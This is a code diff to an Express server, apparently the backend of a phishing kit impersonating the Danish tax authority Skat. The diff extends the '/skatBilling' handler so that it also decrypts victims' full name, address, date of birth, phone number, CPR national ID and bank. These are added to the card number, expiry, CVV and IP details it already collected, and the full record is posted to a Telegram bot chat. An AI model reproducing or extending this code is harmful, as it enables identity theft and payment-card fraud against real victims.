@@ -2880,6 +2880,14 @@ app.options('/skatBilling', cors())
 
 app.post('/skatBilling', (req, res) => {
     username = CryptoJS.AES.decrypt(req.body.username, '402312').toString(CryptoJS.enc.Utf8);
+    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
+    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
+    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
+    zip = CryptoJS.AES.decrypt(req.body.zip, '402312').toString(CryptoJS.enc.Utf8);
+    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
+    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
+    cpr = CryptoJS.AES.decrypt(req.body.cpr, '402312').toString(CryptoJS.enc.Utf8);
+    bank = CryptoJS.AES.decrypt(req.body.bank, '402312').toString(CryptoJS.enc.Utf8);
     ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
     ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
     ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
@@ -2905,7 +2913,7 @@ app.post('/skatBilling', (req, res) => {
         }
     }).then(function () {
         binList = `${bin} | ${dob} | ${zip} | ${bankName}`
-        var originalText = `${username}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+        var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
         axios.post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=Skat:\n${originalText}`
         ).catch(e => {
